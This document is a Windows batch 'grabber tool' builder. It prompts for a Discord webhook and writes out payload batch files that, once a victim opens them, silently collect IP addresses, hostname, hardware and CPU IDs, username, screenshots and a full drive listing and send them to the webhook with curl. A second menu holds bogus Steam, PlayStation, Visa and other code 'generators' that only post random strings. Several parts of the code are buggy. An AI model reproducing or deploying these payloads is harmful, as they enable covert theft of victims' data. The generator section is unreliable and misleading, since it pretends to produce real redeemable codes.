��&cls
@echo off
chcp 65001
color 5
title made by wock


:menu
cls
echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo               ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗     ████████╗ ██████╗  ██████╗ ██╗
echo              ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║
echo              ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝       ██║   ██║   ██║██║   ██║██║
echo              ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗       ██║   ██║   ██║██║   ██║██║
echo              ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
echo               ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

echo                                             GRABBER OPTIONS                             
                            

echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                    
echo      !ip.  = Grab  Real Ip              !tut. =  How to Use              !public.  =  Grab  public Ip             
               
echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                                
echo      !pc.  =  Pc Info Grabber           !q.  =  Exit                     !ss.  =  Screenshot Grabber
                             
echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                         
echo                                   !folder. =  Folder Size Calculator

echo ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo                                   !gens = Will Take You To Another Page
         
echo  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                   
                                                                         
set /p choice=Enter your choice : 

if "%choice%"=="" goto menu
if "%choice%"=="!ip" goto create_ip_grabber_script
if "%choice%"=="!public" goto create_ipk_grabber_script
if "%choice%"=="!pc" goto create_pc_info_grabber_script
if "%choice%"=="!ss" goto create_screenshot_grabber_script
if "%choice%"=="!folder" goto folder_size_calculator
if "%choice%"=="!ipo" goto location_grabber
if "%choice%"=="!tut" goto how_to_use
if "%choice%"=="!gens" goto generatormenu
if "%choice%"=="q" exit
goto menu

:how_to_use
cls
echo Here are the instructions on how to use this tool:
echo 1. Select one of the options 
echo 2. Once you know what you want to use, enter a Discord webhook 
echo 3. Once you've done that, a new batch file will show up on your PC. If someone opens it, their info will be sent to the Discord webhook.
pause
goto menu

:create_ip_grabber_script
cls
echo Creating IP Grabber Script...
set /p "webhook=Enter your Discord webhook URL: "

rem Check if webhook is provided
if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo @echo off > ip_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"ip.txt" %webhook% >> ip_grabber_exec.bat
echo ipconfig ^>ip.txt >> ip_grabber_exec.bat

echo IP grabber script has been created as ip_grabber_exec.bat.
pause
goto menu

:create_ipk_grabber_script
cls
echo Creating IPK Grabber Script...
set /p "webhook=Enter your Discord webhook URL: "

rem Check if webhook is provided
if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo @echo off > ipk_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"ip.txt" %webhook% >> ipk_grabber_exec.bat
echo curl --silent --output ip.txt http://ipinfo.io/ip >> ipk_grabber_exec.bat
echo curl --silent --output private_ip.txt http://ipconfig.me >> ipk_grabber_exec.bat

echo IPK grabber script has been created as ipk_grabber_exec.bat.
pause
goto menu

:create_ip_grabber_script
cls
echo Creating IP Grabber Script...
set /p "webhook=Enter your Discord webhook URL: "

rem Check if webhook is provided
if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo @echo off > ip_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"ip.txt" %webhook% >> ip_grabber_exec.bat
echo ipconfig ^>ip.txt >> ip_grabber_exec.bat

echo IP grabber script has been created as ip_grabber_exec.bat.
pause
goto menu

:create_pc_info_grabber_script
cls
echo Creating PC Information Grabber Script...
set /p "webhook=Enter your Discord webhook URL: "

rem Check if webhook is provided
if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo @echo off > pc_info_grabber_exec.bat
echo hostname^>pcname.txt >> pc_info_grabber_exec.bat
echo wmic csproduct get uuid^>hwid.txt >> pc_info_grabber_exec.bat 
echo echo %%username%%^>pcusername.txt >> pc_info_grabber_exec.bat
echo wmic cpu get processorid^>cpuid.txt >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"hwid.txt" %webhook% >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"cpuid.txt" %webhook% >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"pcusername.txt" %webhook% >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"pcname.txt" %webhook% >> pc_info_grabber_exec.bat
echo del pcname.txt >> pc_info_grabber_exec.bat
echo del hwid.txt >> pc_info_grabber_exec.bat
echo del pcusername.txt >> pc_info_grabber_exec.bat
echo del cpuid.txt >> pc_info_grabber_exec.bat

echo PC information grabber script has been created as pc_info_grabber_exec.bat.
pause
goto menu

:create_screenshot_grabber_script
cls
echo Creating Screenshot Grabber Script...
set /p "webhook=Enter your Discord webhook URL: "

rem Check if webhook is provided
if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo @echo off > screenshot_grabber_exec.bat
echo "C:\path\to\nircmd.exe" savescreenshot screenshot.png >> screenshot_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"screenshot.png" %webhook% >> screenshot_grabber_exec.bat

echo Screenshot grabber script has been created as screenshot_grabber_exec.bat.
pause
goto menu

:folder_size_calculator
cls
echo Creating Folder Size Calculator Script...
set /p "webhook=Enter your Discord webhook URL: "

rem Check if webhook is provided
if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo @echo off > folder_size_calculator_exec.bat
echo dir C:\ /s /a /w /b > folder_size.txt >> folder_size_calculator_exec.bat
echo curl --silent --output /dev/null -F l=@"folder_size.txt" %webhook% >> folder_size_calculator_exec.bat
echo del folder_size.txt >> folder_size_calculator_exec.bat

echo Folder size calculator script has been created as folder_size_calculator_exec.bat.
pause
goto menu

:ipo
cls
echo Creating IP Location Grabber Script...
set /p "webhook=Enter your Discord webhook URL: "

rem Check if webhook is provided
if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo @echo off > ip_location_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"ip_location.txt" %webhook% >> ip_location_grabber_exec.bat
echo curl http://ipinfo.io > ip_location.txt >> ip_location_grabber_exec.bat

echo IP location grabber script has been created as ip_location_grabber_exec.bat.
pause
goto menu

:generatormenu
cls

echo                                                  Generator Menu
echo. ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                           
echo     !s.=  Steam Code Generator                                           !n.=  Netflix Code Generator
echo  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo     !p.=  PlayStation Network Code Generator                             !x.=  Xbox Live Code Generator
echo  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo     !r.=  Roblox Code Generator                                          !f.=  Spotify Code Generator
echo  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo     !v.=  Fortnite V-Bucks Code Generator                                !d.=  Disney+ Gift Card Generator
echo  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo     !e.=  Epic Games Gift Card Generator                                 !t.=  Twitch Prime Code Generator
echo  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo     !o.=  Nintendo eShop Code Generator                                  !m.=  Minecraft Gift Code Generator
echo  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo     !c.=  VISA/Mastercard Gift Card Generator                            !spam.=  Webhook Spammer
echo                                                 !exit. Exit

echo.  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

set /p gen_choice=Enter your choice:

if "%gen_choice%"=="!s" goto steamgen
if "%gen_choice%"=="!spam" goto messagesender
if "%gen_choice%"=="!exit" goto :eof
if "%gen_choice%"=="!n" goto netflixgen
if "%gen_choice%"=="!p" goto psngen
if "%gen_choice%"=="!x" goto xboxgen
if "%gen_choice%"=="!r" goto robloxgen
if "%gen_choice%"=="!f" goto spotifygen
if "%gen_choice%"=="!v" goto fortnitegen
if "%gen_choice%"=="!d" goto disneyplusgen
if "%gen_choice%"=="!e" goto epicgamesgen
if "%gen_choice%"=="!t" goto twitchprimegen
if "%gen_choice%"=="!o" goto nintendoeshopgen
if "%gen_choice%"=="!m" goto minecraftgen
if "%gen_choice%"=="!c" goto visamastercardgen

:steamgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "length=15"

set /p "webhook=Enter Discord webhook URL for Steam codes: "

:steamgen_loop
set /p "num_codes=Enter the number of Steam codes to generate (0 to exit): "
if %num_codes% equ 0 goto menu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 36"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://store.steampowered.com/account/registerkey?key=%code%\"}" %webhook%
)

goto steamgen_loop

:netflixgen
REM Add Netflix Code Generator Logic Here

goto menu

:psngen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "length=12"

set /p "webhook=Enter Discord webhook URL for PlayStation Network codes: "

:psngen_loop
set /p "num_codes=Enter the number of PlayStation Network codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 36"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://store.playstation.com/en-us/redeem-code/%code%\"}" %webhook%
)

goto psngen_loop


:xboxgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for Xbox Live codes: "

:xboxgen_loop
set /p "num_codes=Enter the number of Xbox Live codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 36"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://redeem.microsoft.com/%code%\"}" %webhook%
)

goto xboxgen_loop



:robloxgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=12"

set /p "webhook=Enter Discord webhook URL for Roblox codes: "

:robloxgen_loop
set /p "num_codes=Enter the number of Roblox codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.roblox.com/gamecard/redeem/%code%\"}" %webhook%
)

goto robloxgen_loop



:spotifygen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=10"

set /p "webhook=Enter Discord webhook URL for Spotify codes: "

:spotifygen_loop
set /p "num_codes=Enter the number of Spotify codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.spotify.com/activate/%code%\"}" %webhook%
)

goto spotifygen_loop

:fortnitegen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for Fortnite V-Bucks codes: "

:fortnitegen_loop
set /p "num_codes=Enter the number of Fortnite V-Bucks codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.fortnite.com/redeem/%code%\"}" %webhook%
)

goto fortnitegen_loop

:disneyplusgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=12"

set /p "webhook=Enter Discord webhook URL for Disney+ Gift Card codes: "

:disneyplusgen_loop
set /p "num_codes=Enter the number of Disney+ Gift Card codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.disneyplus.com/redeem/%code%\"}" %webhook%
)

goto disneyplusgen_loop

:epicgamesgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for Epic Games Gift Card codes: "

:epicgamesgen_loop
set /p "num_codes=Enter the number of Epic Games Gift Card codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.epicgames.com/redeem/%code%\"}" %webhook%
)

goto epicgamesgen_loop

:twitchprimegen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=12"

set /p "webhook=Enter Discord webhook URL for Twitch Prime codes: "

:twitchprimegen_loop
set /p "num_codes=Enter the number of Twitch Prime codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.twitch.tv/redeem/%code%\"}" %webhook%
)

goto twitchprimegen_loop

:nintendoeshopgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for Nintendo eShop codes: "

:nintendoeshopgen_loop
set /p "num_codes=Enter the number of Nintendo eShop codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.nintendo.com/en_US/shop/redeem/%code%\"}" %webhook%
)

goto nintendoeshopgen_loop

:minecraftgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=25"

set /p "webhook=Enter Discord webhook URL for Minecraft gift codes: "

:minecraftgen_loop
set /p "num_codes=Enter the number of Minecraft gift codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.minecraft.net/redeem/%code%\"}" %webhook%
)

goto minecraftgen_loop
:visamastercardgen
@echo off
setlocal
set "characters=0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for VISA/Mastercard gift cards: "

:visamastercardgen_loop
set /p "num_cards=Enter the number of VISA/Mastercard gift cards to generate (0 to exit): "
if %num_cards% equ 0 goto menu

for /l %%n in (1,1,%num_cards%) do (
    set "card_number="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 10"
        for %%j in (!rand_idx!) do set "digit=!characters:~%%j,1!"
        set "card_number=!card_number!!digit!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"VISA/Mastercard Gift Card Number: %card_number%\"}" %webhook%
)

goto visamastercardgen_loop
